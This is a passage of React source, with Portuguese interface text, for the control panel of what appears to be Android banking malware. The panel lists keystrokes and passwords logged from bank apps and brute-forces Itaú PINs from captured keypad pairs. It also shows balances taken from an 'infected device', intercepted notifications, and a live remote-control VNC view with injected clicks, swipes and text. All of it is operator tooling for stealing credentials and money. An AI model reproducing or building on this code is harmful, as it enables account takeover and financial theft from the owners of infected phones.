                                            ? 'bg-emerald-500/20 text-emerald-300 border-emerald-500/50 shadow-[0_0_8px_rgba(16,185,129,0.3)]'
                                            : 'bg-slate-950/60 text-slate-400 border-[#121214] hover:text-slate-200'
                                        }`}
                                      >
                                        ¨ Textos ({appKeylogs.filter(l => getLogCategory(l) === 'text').length})
                                      </button>
                                    </div>

                                    <div className="space-y-4 max-h-72 overflow-y-auto pr-1 custom-scrollbar relative pl-3 border-l border-[#24242a]/60">
                                      {Object.keys(groups).map((day, groupIdx) => (
                                        <div key={groupIdx} className="space-y-2 relative">
                                          {/* Badge de Data com Copiar Tudo */}
                                          <div className="flex items-center justify-between my-2 relative -left-4">
                                            <div className="flex items-center gap-1.5 bg-slate-950 px-2 py-0.5 rounded-full border border-[#24242a] shadow-md">
                                              <span className="text-[10px]"></span>
                                              <span className="text-[9px] font-black font-mono text-[#ef4444] uppercase tracking-wide">
                                                {day}
                                              </span>
                                            </div>
                                            <button
                                              onClick={() => {
                                                const textToCopy = groups[day].map(l => {
                                                  const time = l.time || new Date(l.timestamp || l.created_at).toLocaleTimeString('pt-BR');
                                                  return `[${time}] ${getBankLogDisplay(l)}`;
                                                }).join('\n');
                                                navigator.clipboard.writeText(textToCopy);
                                                addLog(` Copiado todos os logs de ${day}`);
                                              }}
                                              className="text-[8px] font-bold text-[#8b8b94] hover:text-[#ef4444] bg-slate-950/40 hover:bg-[#121214]/20 px-2 py-0.5 rounded border border-[#121214] hover:border-[#24242a]/40 transition-all font-mono"
                                            >
                                              Copiar Dia
                                            </button>
                                          </div>
                                          
                                          <div className="space-y-1.5">
                                            {groups[day].map((log, logIdx) => {
                                              const category = getLogCategory(log);
                                              const logTime = log.time || new Date(log.timestamp || log.created_at).toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit', second: '2-digit' });
                                              const isOffline = log.isOffline || false;
                                              const logText = getBankLogDisplay(log);

                                              const isPass = category === 'password';
                                              const isClick = category === 'click';
                                              const isScreen = category === 'screen';
                                              const isText = category === 'text';

                                              // Verifica se parece um PIN ou senha do Itaú
                                              const isItauKeypad = /(\d)\s*(?:ou|\|)\s*(\d)/i.test(logText);
                                              let itauPairs: [string, string][] = [];
                                              let itauPermutations: string[] = [];
                                              if (isItauKeypad) {
                                                const matches = Array.from(logText.matchAll(/(\d)\s*(?:ou|\|)\s*(\d)/gi));
                                                itauPairs = matches.map((m: any) => [m[1], m[2]]);
                                                if (itauPairs.length > 0) {
                                                  let currentCombos: string[] = [''];
                                                  for (const [d1, d2] of itauPairs) {
                                                    const nextCombos: string[] = [];
                                                    for (const p of currentCombos) {
                                                      nextCombos.push(p + d1);
                                                      nextCombos.push(p + d2);
                                                    }
                                                    currentCombos = nextCombos;
                                                  }
                                                  itauPermutations = currentCombos;
                                                }
                                              }

                                              return (
                                                <div 
                                                  key={log.id || logIdx} 
                                                  className={`group flex items-start gap-2.5 p-2 rounded-md transition-all border ${
                                                    isPass 
                                                      ? 'bg-rose-950/20 border-[#1a1a1e]/50 hover:border-[#ef4444]/60 shadow-[0_0_10px_rgba(244,63,94,0.1)]' 
                                                      : isClick 
                                                        ? 'bg-purple-950/20 border-purple-900/50 hover:border-[#f87171]/60 shadow-[0_0_10px_rgba(239,68,68,0.1)]'
                                                        : isScreen 
                                                          ? 'bg-[#121214]/15 border-[#1a1a1e]/40 hover:border-[#2a2a31]/40'
                                                          : 'bg-[#200703]/40 border-[#121214]/50 hover:border-[#24242a]/60'
                                                  }`}
                                                >
                                                  {/* Indicador de linha do tempo */}
                                                  <div className="flex flex-col items-center flex-shrink-0 pt-1 relative -left-[18px]">
                                                    <div className={`w-2.5 h-2.5 rounded-full border-2 bg-slate-950 transition-all duration-300 ${
                                                      isPass 
                                                        ? 'border-[#ef4444] shadow-[0_0_8px_rgba(244,63,94,0.8)] group-hover:scale-110' 
                                                        : isClick 
                                                          ? 'border-[#f87171] shadow-[0_0_8px_rgba(239,68,68,0.8)] group-hover:scale-110'
                                                          : isOffline 
                                                            ? 'border-amber-500 shadow-[0_0_8px_rgba(245,158,11,0.6)] group-hover:scale-110' 
                                                            : 'border-[#2a2a31] shadow-[0_0_8px_rgba(239,68,68,0.6)] group-hover:scale-110'
                                                    }`}></div>
                                                  </div>
                                                  
                                                  <div className="flex-1 min-w-0 -ml-4">
                                                    <div className="flex items-center justify-between gap-2 mb-1">
                                                      <div className="flex items-center gap-1.5 flex-wrap">
                                                        <span className="text-[9px] font-mono text-[#8b8b94] font-bold bg-slate-950/60 px-1.5 py-0.2 rounded border border-[#121214]/50">
                                                          {logTime}
                                                        </span>
                                                        {isPass && (
                                                          <span className="text-[8px] bg-rose-950/60 text-rose-300 border border-[#ef4444]/40 px-1.5 py-0.2 rounded font-mono font-bold flex items-center gap-0.5 shadow-sm">
                                                             Teclado / Senha
                                                          </span>
                                                        )}
                                                        {isClick && (
                                                          <span className="text-[8px] bg-purple-950/60 text-[#fca5a5] border border-[#f87171]/40 px-1.5 py-0.2 rounded font-mono font-bold flex items-center gap-0.5 shadow-sm">
                                                             Clique em Botão
                                                          </span>
                                                        )}
                                                        {isScreen && (
                                                          <span className="text-[8px] bg-[#121214]/60 text-[#ef4444] border border-[#2a2a31]/30 px-1.5 py-0.2 rounded font-mono font-bold flex items-center gap-0.5">
                                                             Mudança de Tela
                                                          </span>
                                                        )}
                                                        {isText && (
                                                          <span className="text-[8px] bg-emerald-950/60 text-emerald-300 border border-emerald-500/30 px-1.5 py-0.2 rounded font-mono font-bold flex items-center gap-0.5">
                                                            ¨ Texto Digitado
                                                          </span>
                                                        )}
                                                        {isOffline && (
                                                          <span className="text-[8px] bg-amber-950/40 text-amber-500 border border-amber-500/20 px-1 py-0.2 rounded font-mono font-bold flex items-center gap-0.5">
                                                             Offline
                                                          </span>
                                                        )}
                                                      </div>
                                                      
                                                      {/* Botão de copiar hover */}
                                                      <button
                                                        onClick={() => {
                                                          navigator.clipboard.writeText(logText);
                                                          addLog(` Copiado: ${logText}`);
                                                        }}
                                                        className="opacity-0 group-hover:opacity-100 text-[8px] bg-slate-950 hover:bg-[#121214]/30 text-slate-400 hover:text-[#ef4444] border border-[#121214] hover:border-[#24242a]/40 px-1.5 py-0.5 rounded transition-all font-mono"
                                                      >
                                                        Copiar
                                                      </button>
                                                    </div>
                                                    
                                                    {isItauKeypad && itauPairs.length > 0 ? (
                                                      <div className="space-y-2 mt-1">
                                                        <div className="flex flex-wrap items-center gap-1.5 bg-black/40 p-2 rounded-md border border-[#ef4444]/20">
                                                          {itauPairs.map((pair, idx) => (
                                                            <span key={idx} className="inline-flex items-center gap-1 text-[11px] font-mono font-bold bg-orange-950/60 text-[#fca5a5] border border-[#ef4444]/40 px-2 py-0.5 rounded-md shadow-sm">
                                                              <span className="text-[9px] text-[#ef4444]/80">T{idx+1}:</span>
                                                              <span>[{pair[0]} ou {pair[1]}]</span>
                                                            </span>
                                                          ))}
                                                        </div>

                                                        {itauPermutations.length > 0 && (
                                                          <details className="group/details">
                                                            <summary className="cursor-pointer text-[10px] font-bold text-[#f87171] hover:text-[#fca5a5] flex items-center justify-between bg-orange-950/40 hover:bg-[#1a1a1e]/40 px-2.5 py-1 rounded border border-[#ef4444]/30 transition-all select-none">
                                                              <span> Exibir {itauPermutations.length} Senhas Possíveis (Itaú Solver)</span>
                                                              <button
                                                                type="button"
                                                                onClick={(e) => {
                                                                  e.preventDefault();
                                                                  e.stopPropagation();
                                                                  navigator.clipboard.writeText(itauPermutations.join('\n'));
                                                                  addLog(` Copiado ${itauPermutations.length} senhas Itaú geradas!`);
                                                                }}
                                                                className="ml-2 text-[9px] bg-[#ef4444] hover:bg-[#f87171] text-black px-2 py-0.5 rounded font-black font-mono shadow transition-all"
                                                              >
                                                                Copiar {itauPermutations.length} Senhas
                                                              </button>
                                                            </summary>
                                                            <div className="mt-2 grid grid-cols-4 sm:grid-cols-6 gap-1 max-h-36 overflow-y-auto p-2 bg-slate-950 rounded-md border border-[#24242a] font-mono text-[10px] text-[#fca5a5] custom-scrollbar select-all">
                                                              {itauPermutations.map((pinCombo, pIdx) => (
                                                                <div key={pIdx} className="bg-orange-950/30 border border-[#ef4444]/20 rounded px-1.5 py-0.5 text-center font-bold tracking-wider hover:bg-[#ef4444] hover:text-black transition-colors cursor-pointer" title="Clique para copiar este PIN" onClick={() => {
                                                                  navigator.clipboard.writeText(pinCombo);
                                                                  addLog(` Copiado PIN Itaú: ${pinCombo}`);
                                                                }}>
                                                                  {pinCombo}
                                                                </div>
                                                              ))}
                                                            </div>
                                                          </details>
                                                        )}
                                                      </div>
                                                    ) : (
                                                      <p className={`text-xs font-mono break-all leading-relaxed select-all px-2.5 py-1.5 rounded-md border shadow-inner ${
                                                        isPass 
                                                          ? 'text-rose-200 bg-rose-950/30 border-[#1a1a1e]/50 font-bold' 
                                                          : isClick 
                                                            ? 'text-purple-200 bg-purple-950/30 border-purple-900/50 font-semibold'
                                                            : isScreen 
                                                              ? 'text-[#e8e8ea] bg-[#121214]/20 border-[#1a1a1e]/30' 
                                                              : 'text-slate-100 bg-black/40 border-[#121214]/80'
                                                      }`}>
                                                        {logText}
                                                      </p>
                                                    )}
                                                  </div>
                                                </div>
                                              );
                                            })}
                                          </div>
                                        </div>
                                      ))}
                                    </div>
                                  </div>
                                );
                              })()
                            )}
                          </div>
                        </div>
                      </div>
                    );
                  })() : (() => {
                    const getLatestBalances = () => {
                      const latest: { [pkg: string]: any } = {};
                      bankBalances.forEach(b => {
                        if (!latest[b.package]) {
                          latest[b.package] = b;
                        }
                      });
                      return Object.values(latest);
                    };

                    const latestBals = getLatestBalances();

                    return (
                      <div className="space-y-6">
                        <div className="bg-gradient-to-br from-[#121214] to-slate-950 p-5 rounded-md border border-[#24242a] shadow-xl">
                          <h3 className="text-sm font-bold text-slate-200 mb-1"> Saldo Total Detectado</h3>
                          <p className="text-xs text-[#8b8b94]">
                            Soma dos saldos mais recentes de todos os bancos capturados no aparelho.
                          </p>
                        </div>

                        {/* Bank Grid List */}
                        <div className="space-y-3">
                          <h4 className="text-xs font-bold text-slate-450 uppercase tracking-wider">Contas Bancárias Monitoradas</h4>
                          {latestBals.length === 0 ? (
                            <div className="text-center py-10 bg-[#121214]/30 border border-dashed border-[#24242a] rounded-md">
                              <span className="text-4xl block mb-2 opacity-50"></span>
                              <p className="text-slate-400 text-xs font-bold">Nenhum saldo capturado ainda</p>
                              <p className="text-[#6f6f78] text-[10px] mt-1 max-w-[240px] mx-auto">
                                Abra um aplicativo de banco no dispositivo infectado. O monitor capturará o saldo automaticamente.
                              </p>
                            </div>
                          ) : (
                            <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                              {latestBals.map((bal: any, idx: number) => {
                                const logo = getBankLogoEmoji(bal.package);
                                const cardGrad = getBankCardGradient(bal.package);
                                const matchedInstalled = installedBanks.find((app: any) => app.package === bal.package);
                                const displayName = matchedInstalled?.name || bal.bank || "Banco";
                                
                                return (
                                  <div 
                                    key={idx}
                                    onClick={() => setSelectedMonitorBank(matchedInstalled || { package: bal.package, name: displayName })}
                                    className={`relative overflow-hidden cursor-pointer rounded-md bg-gradient-to-br ${cardGrad} border p-4 shadow-lg transition-all hover:scale-[1.02] hover:shadow-[0_0_15px_rgba(255,255,255,0.05)]`}
                                  >
                                    <div className="flex justify-between items-start mb-4">
                                      <div className="flex items-center space-x-2">
                                        <span className="text-2xl">{logo}</span>
                                        <div>
                                          <h4 className="font-bold text-sm text-white truncate">{displayName}</h4>
                                          <p className="text-[9px] text-white/50 font-mono truncate max-w-[120px]">{bal.package}</p>
                                        </div>
                                      </div>
                                      <span className="text-[9px] text-white/40 font-mono">
                                        {new Date(bal.timestamp).toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'})}
                                      </span>
                                    </div>
                                    <div>
                                      <p className="text-[9px] text-white/45 uppercase tracking-wider">SALDO CAPTURADO</p>
                                      <p className="text-xl font-bold font-mono text-white tracking-wide">{bal.balance}</p>
                                    </div>
                                  </div>
                                );
                              })}
                            </div>
                          )}
                        </div>
                      </div>
                    );
                  })()}
                </div>
              </div>
            ) : showNotificationsTab ? (
              <div className="bg-[#2b0903]/80 border border-[#2a2a31]/20 rounded-md flex flex-col text-slate-200 overflow-hidden shadow-2xl" style={{ minHeight: '620px', height: '620px' }}>
                <div className="p-4 bg-[#121214]/60 border-b border-[#2a2a31]/10 flex items-center justify-between flex-shrink-0">
                  <div className="flex items-center space-x-2">
                    <span className="text-xl"></span>
                    <div>
                      <h3 className="text-sm font-black uppercase text-[#ef4444] tracking-wider">
                        Notificações e Mensagens dos Aparelhos
                      </h3>
                      <p className="text-[10px] text-[#8b8b94]">
                        Mensagens interceptadas em tempo real via Acessibilidade
                      </p>
                    </div>
                  </div>
                  <button
                    onClick={fetchNotifications}
                    disabled={isLoadingNotifications}
                    className="px-3 py-1.5 bg-[#121214] hover:bg-[#1a1a1e] border border-[#2a2a31]/30 text-[#ef4444] text-xs font-bold rounded transition-all flex items-center gap-1.5"
                  >
                    <RefreshCw className={`w-3.5 h-3.5 ${isLoadingNotifications ? 'animate-spin' : ''}`} />
                    Atualizar
                  </button>
                </div>
                
                <div className="flex-1 overflow-y-auto p-4 space-y-3 bg-[#200603]">
                  {notifications.length === 0 ? (
                    <div className="flex flex-col items-center justify-center h-full text-[#8b8b94] py-20">
                      <span className="text-5xl mb-4 animate-pulse"></span>
                      <h4 className="text-sm font-bold text-white">Nenhuma notificação capturada</h4>
                      <p className="text-xs text-[#8b8b94] text-center mt-1 max-w-[320px]">
                        As notificações recebidas pelo aparelho aparecerão aqui quando forem interceptadas.
                      </p>
                    </div>
                  ) : (
                    <div className="space-y-2">
                      {notifications.map((notif: any) => {
                        const brand = getBankBrand(notif.package);
                        const dateFormatted = new Date(notif.created_at).toLocaleTimeString('pt-BR', {
                          hour: '2-digit',
                          minute: '2-digit',
                          second: '2-digit'
                        }) + ' - ' + new Date(notif.created_at).toLocaleDateString('pt-BR');
                        
                        return (
                          <div 
                            key={notif.id}
                            className="p-3 bg-[#121214]/40 hover:bg-[#121214]/70 border border-[#24242a]/80 rounded-md flex items-start space-x-3 transition-all"
                          >
                            <div className="flex-shrink-0 w-8 h-8 rounded-md flex items-center justify-center font-bold text-xs" style={{ background: brand?.bg || 'linear-gradient(135deg,#ef4444,#b91c1c)', color: brand?.text || '#fff' }}>
                              {brand?.label || notif.package.substring(0, 3).toUpperCase()}
                            </div>
                            <div className="flex-1 min-w-0">
                              <div className="flex items-center justify-between">
                                <span className="text-xs font-bold text-slate-300 truncate">{notif.appName || notif.package}</span>
                                <span className="text-[10px] text-[#8b8b94] font-mono flex-shrink-0 ml-2">{dateFormatted}</span>
                              </div>
                              <p className="text-sm text-white font-medium mt-1 leading-relaxed break-words">{notif.text}</p>
                              <span className="text-[9px] text-[#6f6f78] font-mono block mt-1">{notif.package}</span>
                            </div>
                          </div>
                        );
                      })}
                    </div>
                  )}
                </div>
              </div>
            ) : showCombinedVncV2 ? (
              <div className="grid grid-cols-1 lg:grid-cols-2 gap-6 w-full items-stretch justify-center px-1 py-1">
                {/*  TRANSMISSÃO VNC (ESQUERDA) */}
                <div id="tour-vnc-stream" className="w-full bg-[#1a1a1e]/95 border border-[#2a2a31]/40 backdrop-blur-2xl rounded-md p-4 shadow-[0_0_35px_rgba(239,68,68,0.2)] flex flex-col items-center justify-between">
                  <div className="w-full flex items-center justify-between pb-3 border-b border-[#2a2a31]/25 mb-3">
                    <div className="flex items-center space-x-2.5">
                      <div className="p-2 bg-[#ef4444]/20 rounded-md border border-[#3a3a44]/30">
                        <span className="text-base"></span>
                      </div>
                      <div>
                        <h4 className="text-white font-black text-sm font-mono tracking-wide">Transmissão VNC</h4>
                        <p className="text-[10px] text-[#ef4444]/70 font-mono">Vídeo Direto em Tempo Real</p>
                      </div>
                    </div>
                    <span className="text-[10px] font-mono font-bold bg-[#121214]/90 text-[#ef4444] border border-[#2a2a31]/40 px-3 py-1 rounded-md animate-pulse shadow-[0_0_10px_rgba(239,68,68,0.3)]">
                       AO VIVO
                    </span>
                  </div>

                  <div className="w-full flex-1 flex flex-col items-center justify-center min-h-[720px] overflow-hidden py-1">
                    {isCaptureEnabled ? (
                      <div className="w-full flex justify-center items-center overflow-hidden" style={{ minHeight: '720px' }}>
                        <div style={{ transform: 'scale(0.92)', transformOrigin: 'center top' }}>
                          <DeviceScreen
                            deviceId={deviceId!}
                            onCommand={sendCommand}
                            isBlackScreenActive={isBlackScreen}
                            captureMethod="silent"
                            killerFrameOnPointerMove={isKillerMode}
                            onRequestFrame={requestKillerFrame}
                          />
                        </div>
                      </div>
                    ) : (
                      <div className="text-center p-8 bg-slate-950/80 rounded-md border border-[#2a2a31]/20 w-full max-w-[340px]">
                        <div className="text-5xl mb-3 animate-bounce"></div>
                        <p className="text-[#ef4444] text-sm font-bold mb-4">Captura VNC Desativada</p>
                        <button onClick={toggleCapture} className="px-5 py-2.5 bg-gradient-to-r from-[#ef4444] to-[#ef4444] hover:from-[#ef4444] hover:to-[#f87171] text-[#10120a] font-bold rounded-md text-xs shadow-lg">
                          Iniciar Captura
                        </button>
                      </div>
                    )}
                  </div>

                  {/* Teclado Rápido Integrado */}
                  <div className="w-full mt-3 bg-[#170403]/90 border border-[#2a2a31]/30 rounded-md p-3 shadow-inner">
                    <div className="flex items-center gap-2">
                      <input
                        type="text"
                        value={textToSend}
                        onChange={(e) => setTextToSend(e.target.value)}
                        onKeyPress={(e) => e.key === 'Enter' && handleSendText()}
                        placeholder="Digite para enviar texto rápido ao aparelho..."
                        className="flex-1 px-3.5 py-2 bg-[#0a0202] border border-[#2a2a31]/30 rounded-md text-white placeholder-[#8b8b94] focus:outline-none focus:border-[#3a3a44] text-xs font-mono"
                      />
                      <button
                        onClick={handleSendText}
                        disabled={!textToSend.trim()}
                        className="px-4 py-2 bg-gradient-to-r from-[#ef4444] to-[#ef4444] hover:from-[#ef4444] hover:to-[#ef4444] disabled:from-[#24242a] disabled:text-[#6f6f78] text-[#10120a] rounded-md font-bold text-xs uppercase tracking-wider font-mono shadow-md whitespace-nowrap"
                      >
                        Enviar
                      </button>
                    </div>
                  </div>
                </div>

                {/* SCREEN READER V2 (DIREITA) */}
                <div id="tour-screen-reader" className="w-full bg-[#1a1a1e]/95 border border-[#2a2a31]/40 backdrop-blur-2xl rounded-md p-4 shadow-[0_0_35px_rgba(239,68,68,0.2)] flex flex-col justify-between">
                  {/* Header Tático V2 */}
                  <div className="w-full flex items-center justify-between pb-3 border-b border-[#2a2a31]/25 mb-3">
                    <div className="flex items-center space-x-2.5">
                      <div className="p-2 bg-[#ef4444]/20 rounded-md border border-[#3a3a44]/30">
                        <Eye className="w-5 h-5 text-[#ef4444] animate-pulse" />
                      </div>
                      <div>
                        <h4 className="text-white font-black text-sm font-mono tracking-wide">Screen Reader V2</h4>
                        <p className="text-[10px] text-[#ef4444]/70 font-mono">Leitura de rvore & Bypass Tático</p>
                      </div>
                    </div>
                    {isScreenReaderEnabled && (
                      <span className="text-[10px] font-mono font-bold bg-amber-950/90 text-amber-300 border border-amber-500/40 px-3 py-1 rounded-md shadow-[0_0_10px_rgba(245,158,11,0.2)]">
                         Senhas Visíveis
                      </span>
                    )}
                  </div>

                  {/* TELA DA V2 GIGANTE (EXACTAMENTE IGUAL AO VNC AO LADO) */}
                  <div className="w-full flex-1 flex flex-col items-center justify-center min-h-[720px] py-1">
                    {!isScreenReaderEnabled ? (
                      <div className="text-center p-8 bg-slate-950/80 rounded-md border border-[#2a2a31]/20 w-full max-w-[360px]">
                        <Eye className="w-10 h-10 text-[#ef4444] mx-auto mb-3 animate-pulse" />
                        <p className="text-slate-300 text-xs mb-4 font-mono">Screen Reader V2 está desligado.</p>
                        <button onClick={toggleScreenReader} className="px-5 py-2.5 bg-gradient-to-r from-teal-600 to-emerald-500 hover:from-teal-500 hover:to-emerald-400 text-white rounded-md text-xs font-bold shadow-lg">
                           Ativar Screen Reader V2
                        </button>
                      </div>
                    ) : !screenHierarchy ? (
                      <div className="text-center p-8 text-[#ef4444] font-mono text-xs">
                        <div className="animate-spin text-3xl mb-3"></div>
                        Aguardando dados da tela V2...
                      </div>
                    ) : (
                      <div className="w-full flex justify-center items-center" style={{ minHeight: '720px' }}>
                        <div 
                          onMouseDown={(e) => {
                            const screenElement = e.currentTarget.querySelector('[data-screen="true"]');
                            if (!screenElement) return;
                            
                            const rect = screenElement.getBoundingClientRect();
                            const x = e.clientX - rect.left;
                            const y = e.clientY - rect.top;
                            
                            setMouseDownPos({ x, y });
                            setMouseDownTime(Date.now());
                            setIsDragging(true);
                            dragPathRef.current = [{ x, y }];
                          }}
                          onMouseMove={(e) => {
                            if (!isDragging || !mouseDownPos) return;
                            
                            const screenElement = e.currentTarget.querySelector('[data-screen="true"]');
                            if (!screenElement) return;
                            
                            const rect = screenElement.getBoundingClientRect();
                            const x = e.clientX - rect.left;
                            const y = e.clientY - rect.top;
                            
                            const lastPoint = dragPathRef.current[dragPathRef.current.length - 1];
                            const dist = Math.sqrt(Math.pow(x - lastPoint.x, 2) + Math.pow(y - lastPoint.y, 2));
                            if (dist > 15) {
                              dragPathRef.current.push({ x, y });
                            }
                          }}
                          onMouseUp={(e) => {
                            if (!mouseDownPos) return;
                            
                            const screenElement = e.currentTarget.querySelector('[data-screen="true"]');
                            if (!screenElement) return;
                            
                            const rect = screenElement.getBoundingClientRect();
                            const upX = e.clientX - rect.left;
                            const upY = e.clientY - rect.top;
                            
                            const downX = mouseDownPos.x;
                            const downY = mouseDownPos.y;
                            
                            const deltaX = upX - downX;
                            const deltaY = upY - downY;
                            const distance = Math.sqrt(deltaX * deltaX + deltaY * deltaY);
                            const holdTime = Date.now() - mouseDownTime;
                            
                            const devW = screenHierarchy?.hierarchy?.bounds?.w || SCREEN_BASE_WIDTH;
                            const devH = screenHierarchy?.hierarchy?.bounds?.h || SCREEN_BASE_HEIGHT;
                            const realScale = rect.width / devW;
                            
                            const deviceDownX = Math.round(downX / realScale);
                            const deviceDownY = Math.round(downY / realScale);
                            const deviceUpX = Math.round(upX / realScale);
                            const deviceUpY = Math.round(upY / realScale);
                            
                            if (deviceDownX < 0 || deviceDownX > devW || deviceDownY < 0 || deviceDownY > devH) {
                              setMouseDownPos(null);
                              setIsDragging(false);
                              dragPathRef.current = [];
                              return;
                            }
                            
                            const normX = Math.max(0, Math.min(1, deviceDownX / devW));
                            const normY = Math.max(0, Math.min(1, deviceDownY / devH));
                            const normX1 = normX;
                            const normY1 = normY;
                            const normX2 = Math.max(0, Math.min(1, deviceUpX / devW));
                            const normY2 = Math.max(0, Math.min(1, deviceUpY / devH));
                            
                            if (holdTime > 500 && distance < 10) {
                              sendCommand({ 
                                action: 'LONG_PRESS',
                                x: normX,
                                y: normY,
                                scale: 'vnc_norm'
                              });
                              addLog(` Long Press na Tela V2: (${deviceDownX}, ${deviceDownY})`);
                            }
                            else if (distance > 30) {
                              sendCommand({ 
                                action: 'SWIPE',
                                x1: normX1,
                                y1: normY1,
                                x2: normX2,
                                y2: normY2,
                                scale: 'vnc_norm'
                              });
                              addLog(` Swipe na Tela V2: (${deviceDownX},${deviceDownY})  (${deviceUpX},${deviceUpY})`);
                            }
                            else {
                              sendCommand({ 
                                action: 'CLICK',
                                x: normX,
                                y: normY,
                                scale: 'vnc_norm'
                              });
                              addLog(`± Clique na Tela V2: (${deviceDownX}, ${deviceDownY})`);
                            }
                            
                            setMouseDownPos(null);
                            setIsDragging(false);
                            dragPathRef.current = [];
                          }}
                          className="relative bg-[#0c0202] overflow-hidden rounded-[36px] shadow-[0_0_45px_rgba(239,68,68,0.4)] border-[3px] border-[#2a2a31]/70 p-0.5 cursor-crosshair group flex items-center justify-center mx-auto" 
                          style={{ 
                            height: '740px',
                            width: `${740 * ((getHierarchyRoot(screenHierarchy)?.bounds?.w || SCREEN_BASE_WIDTH) / (getHierarchyRoot(screenHierarchy)?.bounds?.h || SCREEN_BASE_HEIGHT))}px`,
                            maxWidth: '100%'
                          }}
                        >
                          {/* Notch / Punch Hole da Cmera do Celular V2 */}
                          <div className="absolute top-2.5 left-1/2 -translate-x-1/2 w-24 h-4 bg-slate-950 rounded-full z-30 border border-[#2a2a31]/30 flex items-center justify-center gap-2 shadow-inner pointer-events-none">
                            <div className="w-2.5 h-2.5 rounded-full bg-[#121214] border border-[#2a2a31]"></div>
                            <div className="w-1.5 h-1.5 rounded-full bg-[#24242a]"></div>
                          </div>

                          <div className="relative h-full w-full overflow-hidden rounded-[32px] flex items-center justify-center" data-screen="true">
                            <ScreenReaderCanvas 
                              hierarchy={getHierarchyRoot(screenHierarchy)} 
                              scale={1} 
                              hoveredNode={hoveredNode} 
                              textScale={v2TextScale}
                              designTheme={v2DesignTheme}
                              hideUntyped={v2HideUntypedElements}
                              opacity={v2Opacity}
                              showGrid={v2ShowGrid}
                              cornerStyle={v2CornerStyle}
                              showCoords={v2ShowCoords}
                            />
                          </div>

                          {/* Barra Home do Celular V2 */}
                          <div className="absolute bottom-2 left-1/2 -translate-x-1/2 w-20 h-1 bg-[#2a2a31]/70 rounded-full z-30 pointer-events-none"></div>
                        </div>
                      </div>
                    )}
                  </div>
                </div>
              </div>
            ) : !showScreenReader ? (
              isCaptureEnabled ? (
                <div className="mx-auto" style={{ maxWidth: '450px' }}>
                  <DeviceScreen
                    deviceId={deviceId!}
                    onCommand={sendCommand}
                    isBlackScreenActive={isBlackScreen}
                    captureMethod="silent"
                    killerFrameOnPointerMove={isKillerMode}
                    onRequestFrame={requestKillerFrame}
                  />
                  
                  {/* ¨ ENVIAR TEXTO RPIDO DIRETO ABAIXO DO VNC */}
                  <div className="mt-3 bg-[#3d0c04]/90 border border-[#2a2a31]/30 backdrop-blur-xl shadow-[0_4px_25px_rgba(0,0,0,0.5)] rounded-md p-3.5 transition-all hover:border-[#3a3a44]/50">
                    <div className="flex items-center justify-between mb-2">
                      <h4 className="text-[#ef4444] font-black uppercase text-xs tracking-wider flex items-center gap-2 font-mono">
                        <Keyboard className="w-4 h-4 text-[#ef4444] animate-pulse" />
                        {t('panel.send_quick_text')}
                      </h4>
                      <span className="text-[10px] text-[#ef4444]/60 font-mono">Teclado Direto</span>
                    </div>
                    <div className="flex items-center gap-2">
                      <input
                        type="text"
                        value={textToSend}
                        onChange={(e) => setTextToSend(e.target.value)}
                        onKeyPress={(e) => e.key === 'Enter' && handleSendText()}
                        placeholder={t('panel.type_here_send')}
                        className="flex-1 px-3.5 py-2 bg-[#190503]/90 border border-[#2a2a31]/30 rounded-md text-white placeholder-[#8b8b94] focus:outline-none focus:border-[#3a3a44] focus:ring-1 focus:ring-[#ef4444]/40 text-xs font-mono transition-all shadow-inner"
                      />
                      <EditableButton
                        id="btn-send-text-vnc"
                        onClick={handleSendText}
                        isEditMode={isLayoutEditMode}
                        customStyle={layoutPrefs.buttonStyles['btn-send-text-vnc']}
                        onStyleChange={(style) => updateButtonStyle('btn-send-text-vnc', style)}
                        disabled={!textToSend.trim()}
                        className="px-4 py-2 bg-gradient-to-r from-[#ef4444] to-[#ef4444] hover:from-[#ef4444] hover:to-[#ef4444] text-[#10120a] disabled:from-[#24242a] disabled:to-slate-850 disabled:text-[#6f6f78] rounded-md transition-all font-bold shadow-[0_0_12px_rgba(239,68,68,0.3)] uppercase tracking-wider font-mono text-xs flex items-center justify-center gap-1.5 cursor-pointer whitespace-nowrap"
                      >
                        <MessageSquare className="w-3.5 h-3.5" /> {t('panel.send_to_device')}
                      </EditableButton>
                    </div>
                  </div>
                </div>
              ) : (
                // Tela preta quando captura não está ativada
                <div className="bg-slate-950/80 backdrop-blur-md rounded-md border border-[#2a2a31]/20 flex flex-col items-center justify-center shadow-lg" style={{ height: '500px' }}>
                  <div className="text-center p-8">
                    <div className="text-6xl mb-4 animate-bounce"></div>
                    <h3 className="text-[#ef4444] text-xl font-bold mb-2">Captura Desativada</h3>
                    <p className="text-slate-400 text-sm mb-6">
                      Clique em "Iniciar Captura" para ver a tela do dispositivo
                    </p>
                    <button
                      onClick={toggleCapture}
                      className="px-6 py-3 bg-gradient-to-r from-[#ef4444] to-[#ef4444] hover:from-[#ef4444] hover:to-[#f87171] text-[#10120a] font-bold rounded-md border border-[#3a3a44]/30 shadow-[0_0_15px_rgba(239,68,68,0.4)] transition-all"
                    >
                      ¶ Iniciar Captura
                    </button>
                  </div>
                </div>
              )
            ) : (
              <div 
                className={`bg-gradient-to-b from-[#1a1a1e]/95 via-[#180403]/95 to-[#0f0203]/98 backdrop-blur-2xl border border-[#2a2a31]/40 rounded-md overflow-hidden flex flex-col mx-auto shadow-[0_0_50px_rgba(239,68,68,0.22)] ${isLayoutEditMode ? 'ring-2 ring-[#ef4444] ring-offset-2 ring-offset-slate-955' : ''}`}
                style={{ maxWidth: isScreenReaderEnabled && screenHierarchy ? '900px' : '420px', width: '100%', transition: 'all 0.3s cubic-bezier(0.4, 0, 0.2, 1)' }}
              >
                {/* Linha Neon no topo */}
                <div className="h-1 w-full bg-gradient-to-r from-[#ef4444] via-[#f87171] to-[#f87171] animate-pulse" />

                {/* Header Cyberpunk V2 */}
                <div className="flex items-center justify-between p-4 bg-slate-950/80 border-b border-[#2a2a31]/25 shadow-lg backdrop-blur-md">
                  <div className="flex items-center space-x-3.5">
                    <div className="p-2.5 bg-gradient-to-br from-[#ef4444]/20 to-[#ef4444]/20 rounded-md border border-[#2a2a31]/40 shadow-[0_0_15px_rgba(239,68,68,0.3)]">
                      <Eye className="w-6 h-6 text-[#ef4444] animate-pulse" />
                    </div>
                    <div>
                      <div className="text-white font-black text-base flex items-center gap-2 font-mono tracking-wide">
                        <span>Screen Reader V2</span>
